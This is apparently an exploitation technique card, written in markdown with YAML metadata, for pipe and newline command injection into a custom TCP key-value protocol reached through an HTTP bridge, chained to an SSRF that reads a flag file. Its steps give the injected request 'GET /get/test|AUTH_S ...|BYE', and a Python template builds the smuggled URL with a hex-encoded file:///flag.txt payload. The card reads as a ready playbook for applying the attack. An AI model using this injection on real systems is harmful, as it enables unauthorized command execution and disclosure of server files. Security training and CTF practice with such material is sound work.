---
name: memstorage_pipe_newline_command_injection
vuln_type: cmdi
sub_technique: newline_pipe_injection
category: exploitation
safety_level: safe
tags:
- protocol
- injection
- pipe
- newline
- tcp
- memstorage
---

# Memstorage Pipe/Newline Command Injection — Multi-Command Execution Via Delimiter In User Input

## When to Apply

A TCP-based custom protocol server's parseCommand splits input on `|` or `\n`, and user input from an HTTP endpoint is included directly in the protocol stream. Injecting `|CMD arg` into key/value parameters executes arbitrary protocol commands.

## Prerequisites

- TCP custom protocol: parseCommand splits commands via input.split(/\n|\|/)
- HTTP→TCP bridge: Express etc. passes URL params to memstorage protocol
- No pipe/newline sanitization on user input (or bypassable)

## Steps

1. Analyze memstorage.js parseCommand — identify split delimiter (`/\n|\|/`)
2. Identify useful commands from VALID_CMDS list (AUTH, AUTH_S, GET, SET, BYE, etc.)
3. Inject pipe into key via HTTP endpoint (e.g. `/get/:key`):
   `GET /get/test|AUTH_S <hex_creds> <hex_payload>|BYE`
4. Express sends `GET test|AUTH_S ... |BYE` to memstorage TCP
5. parseCommand splits on pipe → 3 commands (GET, AUTH_S, BYE) executed sequentially
6. If AUTH_S result includes Visit=> pattern in response, SSRF chain triggers

## Code Template

```
import urllib.parse
# hex-encode the Visit=>file:///flag.txt payload
visit_hex = 'file:///flag.txt'.encode().hex()
crlf_hex = '0d0a0d0a'  # \r\n\r\n in hex
injected_key = f'test|AUTH_S {crlf_hex} {visit_hex}|BYE'
url = f'http://target/get/{urllib.parse.quote(injected_key, safe="")}'
```

## Examples

### Example 1

- **delimiter**: pipe (|)
- **injected_via**: /get/:key URL parameter
- **auth_cmd**: AUTH_S <hex_id> <hex_pw_or_payload>

Direct pipe injection possible if no input filter is present. AUTH_S hex-decoded result contains the Visit=> payload.
